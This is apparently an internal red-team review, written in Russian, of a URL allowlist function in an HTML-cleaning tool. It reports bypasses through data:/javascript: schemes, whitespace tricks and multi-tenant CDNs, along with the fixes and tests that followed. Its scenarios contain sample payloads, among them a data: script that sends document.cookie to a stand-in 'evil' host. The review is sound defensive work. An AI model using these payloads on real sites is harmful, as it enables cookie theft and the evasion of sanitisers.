# Red Team: `utils/allowlist.ts` — `classifyResource`

**Роль.** Чистая функция-ядро решения **keep / remove / quarantine** для внешнего ресурса.
Переиспользуется DOM-проходами, regex-проходами и JS-детекторами. Это **граница безопасности**
всей модели «белый список + контейнмент».

**Контракт сейчас (строки [55–77](src/mastra/cleaners/utils/allowlist.ts:55)):**
1. пустой/whitespace URL → `keep`
2. `!isAbsoluteUrl` → `keep` («локальный/относительный — разберут другие проходы»)
3. не распарсился хост → `onUncertain` (=quarantine)
4. хост в trusted-set для типа → `keep`
5. известный трекер → `remove`
6. иначе → `quarantine`

**Сильная сторона (отметить):** ошибка парсинга и неизвестный хост ведут в quarantine, а не в
тихое keep. Функция чистая, без I/O, ReDoS-паттернов нет. Это правильный default-deny — **для тех
URL, что вообще доходят до шага 3+.** Проблемы ниже — про URL, которые до этого шага не доходят.

---

## Находки

### [AL-1] 🔴 Bypass · 🟥 Critical · non-http схемы уходят в `keep`

- **Сценарий:** `<script src="data:text/javascript,fetch('//evil/x?'+document.cookie)">`,
  `<iframe src="data:text/html;base64,PHNjcmlwdD4...">`, `<a href="javascript:location='//evil'">`.
- **Сейчас:** `isAbsoluteUrl` ([:28](src/mastra/cleaners/utils/allowlist.ts:28)) распознаёт
  только `^https?://` и `//`. `data:`/`blob:`/`javascript:`/`vbscript:`/`filesystem:` не подходят →
  строка [57](src/mastra/cleaners/utils/allowlist.ts:57) возвращает `keep`.
- **Последствие:** исполняемый чужой код (script/iframe `data:`, `javascript:` в href) **переживает
  очистку нетронутым.** Это классический канал для обфусцированного редиректа/exfil — ровно то, что
  чистильщик обязан ловить.
- **Рекомендация:** явная классификация схемы. Для `script`/`iframe`/`media`:
  `data:`/`blob:`/`javascript:`/`vbscript:` → `quarantine` (а `javascript:` в любых href — `remove`).
  Для `img` `data:` допустим. Добавить обработку **до** проверки `isAbsoluteUrl`.
- **Уверенность:** подтверждено чтением кода. Реальность дыры зависит от того, ловит ли схему
  кто-то ещё → нить **T-3** (strip-event-attrs / replace-offer-links / remove-inline-exfil).

### [AL-2] 🔴 Bypass · 🟧 High · пробел/таб/перевод строки обходят `isAbsoluteUrl`

- **Сценарий:** `src=" https://evil.com/x.js"` (ведущий пробел) либо `src="https:/​/evil.com"`
  с табом/`\n`/`\r` внутри (`ht\ttps://…`, `//ev\nil.com`).
- **Сейчас:** `/^https?:\/\//` требует совпадения с **начала** строки; ведущий пробел/таб срывает
  матч → `keep`. Внутренние `\t\r\n` тоже не матчатся.
- **Последствие:** браузер по URL-спецификации **обрезает** ведущие/хвостовые ASCII-пробелы и
  **вырезает** внутренние `\t\n\r` из URL-атрибутов — и грузит `evil.com`. Чистильщик же видит
  «не абсолютный» → `keep`. Обход.
- **Рекомендация:** нормализовать вход в начале `classifyResource`: `url.trim()` + удалить
  `[\t\r\n]`, и только потом классифицировать.
- **Уверенность:** поведение `isAbsoluteUrl` подтверждено; эксплуатируемость зависит от того, не
  тримит ли URL вызывающий проход → нить **T-1**.

### [AL-3] 🔴 Bypass · 🟧 High · «доверенные» CDN проксируют чужой контент

- **Сценарий:** `<script src="https://cdn.jsdelivr.net/gh/attacker/repo@main/evil.js">` или
  `https://unpkg.com/any-published-pkg/evil.js`.
- **Сейчас:** `cdn.jsdelivr.net`, `unpkg.com`, `cdnjs.cloudflare.com` в `TRUSTED_LIB_CDNS`
  ([policy.ts:13](src/mastra/cleaners/registry/policy.ts:13)); `hostInSet` матчит хост → шаг 4 →
  `keep`. jsDelivr `/gh/` отдаёт **любой** GitHub-репозиторий, npm — **любой** опубликованный пакет.
- **Последствие:** доверие на уровне **хоста** ≠ доверие к **контенту** для мультитенантных CDN.
  Это тот же класс, что исходный баг `jsdeliveris.com`, только теперь хост настоящий. Репин
  (`replace-local-libs-with-cdn`) тут не помогает — он чинит только *известные* либы, а уже
  стоящий «доверенный» URL не трогает. CSP (POL-2) тоже пропускает jsdelivr.
- **Рекомендация:** для `script` с jsdelivr/unpkg — допускать только узнаваемые пакет-пути
  известных библиотек (+ SRI), а `/gh/<user>/<repo>` и произвольные npm-пути → `quarantine`.
  Сверить с логикой `cdn-detector` (Тир 1), чтобы whitelist путей был в одном месте.
- **Уверенность:** подтверждено чтением кода + теста [:15](src/mastra/cleaners/utils/__tests__/allowlist.test.ts:15)
  (тест проверяет, что *валидный npm-путь* остаётся — желаемое; риск `/gh/` не покрыт).

### [AL-4] 🟢 Soundness · 🟨 Medium · плоский trust-set игнорирует тип ресурса

- **Сценарий:** `<script src="https://fonts.googleapis.com/...">`.
- **Сейчас:** `trustedSetsFor` ([:40](src/mastra/cleaners/utils/allowlist.ts:40)) для script/style/iframe
  отдаёт один `TRUSTED_LIB_CDNS`, куда входят `fonts.googleapis.com`/`fonts.gstatic.com`
  (хосты под шрифты/CSS) → они доверены и для `script`.
- **Последствие:** хост, которому положено отдавать только CSS/шрифты, доверяется как источник
  скриптов. Узкий, но реальный type-confusion.
- **Рекомендация:** карта «хост → разрешённые типы» (fonts.* → только style/font; vjs.zencdn.net →
  script/style; и т.д.).
- **Уверенность:** подтверждено чтением кода.

---

## Пробелы в тестах (`__tests__/allowlist.test.ts`)

Не покрыто: `data:`/`blob:`/`javascript:` URL (AL-1); ведущий/внутренний whitespace (AL-2);
jsdelivr `/gh/` и произвольный npm (AL-3); script с font-хоста (AL-4); IDN/punycode; пустой/`#`/
`mailto:`. Есть хорошая регрессия на `jsdeliveris` и базовые keep/remove/quarantine.

## Итог — что чинить первым

1. **AL-1** (data:/javascript: в script/iframe) — Critical, дешёвый фикс, высокий эффект.
2. **AL-2** (нормализация whitespace) — одна строка нормализации закрывает целый класс обхода.
3. **AL-3** (мультитенантные CDN) — требует продуманного path-whitelist, согласовать с Тир 1.

---

## ✅ Статус фиксов (C1)

- **AL-1 ✅** — добавлены `schemeOf` + `classifyScheme`: `data:`/`blob:`/`javascript:`/`vbscript:`/
  `filesystem:` классифицируются **до** `isAbsoluteUrl`, по типу ресурса. Для script/iframe/media/
  stylesheet → `quarantine`; `javascript:`/`vbscript:` в `anchor`(href) → `remove`. Исключения по
  CSP владельца: `data:`+img → keep, `blob:`+media → keep.
- **AL-2 ✅** — `normalizeUrl()` (вырезает `\t\r\n`, срезает ведущие/хвостовые controls+пробел)
  применяется в начале `classifyResource` **и** внутри `isAbsoluteUrl` — закрывает whitespace-обход
  и в гейте `remove-tracker-links`.
- **AL-3 ✅ (path-whitelist для мультитенантных CDN)** — `MULTITENANT_CDNS` (jsdelivr/unpkg) +
  `TRUSTED_CDN_PACKAGES` в `policy.ts`. В `classifyResource` для script/stylesheet/iframe/media на этих
  хостах путь сверяется (`isWhitelistedCdnPath`): jsDelivr `/gh/` (любой GitHub-репо) → quarantine;
  `/npm/<pkg>` и unpkg `/<pkg>` → keep только если `<pkg>` в whitelist (то, на что репиним), иначе
  quarantine. cdnjs СОЗНАТЕЛЬНО оставлен по-хостовым (курируем, произвольный аплоад невозможен). img/
  preconnect не путе-проверяются (пассивны). Парно с **CDN-1** ([cdn-detector](cdn-detector.md)) и
  **POL-2** ([policy](policy.md)). Тесты: +12 в `allowlist.test.ts`; EXT-1-тест обновлён (jsdelivr в
  `_external/` → карантин, т.к. путь не верифицируем на уровне папки).
- **AL-4** — НЕ трогали (карта «хост→типы»); остаётся 🆕.
- Регрессы: `utils/__tests__/allowlist.test.ts` (+16 тестов: whitespace, схемы, легит data:img/blob:media,
  mailto/tel). Все 166 тестов зелёные, `tsc --noEmit` чист.
